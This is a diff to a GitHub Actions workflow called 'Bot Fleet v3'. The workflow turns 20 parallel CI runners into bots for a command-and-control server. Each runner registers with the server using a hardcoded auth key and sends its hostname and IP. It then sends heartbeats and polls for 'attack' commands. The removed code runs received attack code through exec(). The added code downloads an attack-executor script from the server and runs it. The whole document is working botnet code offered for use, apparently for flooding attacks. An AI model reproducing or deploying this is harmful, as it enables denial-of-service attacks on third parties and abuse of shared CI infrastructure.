@@ -1,7 +1,3 @@
-# ╔══════════════════════════════════════════════╗
-# ║  BOT FLEET v3 — Shell Bot                  ║
-# ║  极简shell+curl连接C2，无Python依赖         ║
-# ╚══════════════════════════════════════════════╝
 name: Bot Fleet v3
 
 on:
@@ -15,10 +11,6 @@ on:
         description: 'C2 Port'
         required: true
         default: '1337'
-      auth:
-        description: 'Auth Key'
-        required: true
-        default: 'enibot2024'
   schedule:
     - cron: '13 */4 * * *'
 
@@ -30,84 +22,40 @@ jobs:
       matrix:
         slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
-      - name: Deploy Bot
+      - name: Bot
         run: |
-          C2="${{ github.event.inputs.c2 } }"
-          CPORT="${{ github.event.inputs.c2_port } }"
-          AUTH="${{ github.event.inputs.auth } }"
-          SLICE="${{ matrix.slice } }"
+          C2="${{ github.event.inputs.c2 }}"
+          CPORT="${{ github.event.inputs.c2_port }}"
+          S="${{ matrix.slice }}"
+          SLICE="$S"
 
-          # Generate unique bot ID
           BOT_ID="gh-${SLICE}-$(head -c8 /dev/urandom | md5sum | cut -c1-8)"
           LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
           [ -z "$LOCAL_IP" ] && LOCAL_IP="0.0.0.0"
-          HOSTNAME=$(hostname)
 
-          echo "[+] Bot $BOT_ID → C2: $C2:$CPORT"
+          echo "[+] Bot ${BOT_ID} -> ${C2}:${CPORT}"
 
-          # Register with C2
-          REG=$(curl -s -X POST "http://$C2:$CPORT/api/register" \
+          # Register
+          curl -s -X POST "http://${C2}:${CPORT}/api/register" \
             -H "Content-Type: application/json" \
-            -d "{\"auth\":\"$AUTH\",\"id\":\"$BOT_ID\",\"ip\":\"$LOCAL_IP\",\"hostname\":\"$HOSTNAME\",\"os\":\"linux\",\"arch\":\"x86_64\",\"method\":\"python\"}")
-          echo "  Register: $REG"
+            -d '{"auth":"enibot2024","id":"'"${BOT_ID}"'","ip":"'"${LOCAL_IP}"'","hostname":"'"$(hostname)"'","os":"linux","arch":"x86_64","method":"python"}'
 
-          # Main loop: heartbeat + poll + execute
+          # Download attack executor from C2
+          curl -s "http://${C2}:${CPORT}/attack-executor.py" -o /tmp/executor.py
+
+          # Main loop
           while true; do
             # Heartbeat
-            curl -s -X POST "http://$C2:$CPORT/api/heartbeat" \
+            curl -s -X POST "http://${C2}:${CPORT}/api/heartbeat" \
               -H "Content-Type: application/json" \
-              -d "{\"id\":\"$BOT_ID\"}" > /dev/null 2>&1
+              -d '{"id":"'"${BOT_ID}"'"}' > /dev/null 2>&1
 
-            # Poll for commands
-            CMDS=$(curl -s "http://$C2:$CPORT/api/poll?id=$BOT_ID" 2>/dev/null)
+            # Poll
+            CMDS=$(curl -s "http://${C2}:${CPORT}/api/poll?id=${BOT_ID}")
 
-            # Check if we got attack commands
-            if echo "$CMDS" | grep -q '"type":"attack"'; then
-              echo "  [$(date +%H:%M:%S)] Got attack command!"
-
-              # Extract attack details and execute via Python
-              echo "$CMDS" | python3 -c "
-import json, sys, time, socket, threading, random
-data = json.load(sys.stdin)
-for cmd in data.get('commands', []):
-    if cmd.get('type') == 'attack':
-        code = cmd.get('code', '')
-        aid = cmd.get('attack_id', 0)
-        print(f'Executing attack #{aid}...')
-
-        # Track bytes
-        import socket as _sock
-        _send = _sock.socket.send
-        _sendto = _sock.socket.sendto
-        stats = {'bytes': 0, 'start': time.time()}
-
-        def tsend(self, data, *a, **kw):
-            stats['bytes'] += len(data)
-            return _send(self, data, *a, **kw)
-        def tsendto(self, data, *a, **kw):
-            stats['bytes'] += len(data)
-            return _sendto(self, data, *a, **kw)
-        _sock.socket.send = tsend
-        _sock.socket.sendto = tsendto
-
-        # Execute attack code
-        try:
-            exec(code)
-        except Exception as e:
-            pass
-
-        elapsed = max(time.time() - stats['start'], 0.1)
-        pps = int(stats['bytes'] / elapsed)
-        print(f'Attack #{aid} done: {stats[\"bytes\"]} bytes, {pps} pps')
-
-        # Report result
-        import urllib.request as _req
-        _req.urlopen(_req.Request(
-            f'http://$C2:$CPORT/api/result',
-            data=json.dumps({'id':'$BOT_ID','attack_id':aid,'msg':'done','bytes':stats['bytes'],'pps':pps}).encode(),
-            headers={'Content-Type':'application/json'}
-        ), timeout=10)
-              " 2>/dev/null
+            # Execute attacks
+            if echo "${CMDS}" | grep -q '"type":"attack"'; then
+              C2_URL="http://${C2}:${CPORT}" BOT_ID="${BOT_ID}" python3 /tmp/executor.py <<< "${CMDS}"
             fi
 
             sleep $((8 + RANDOM % 13))
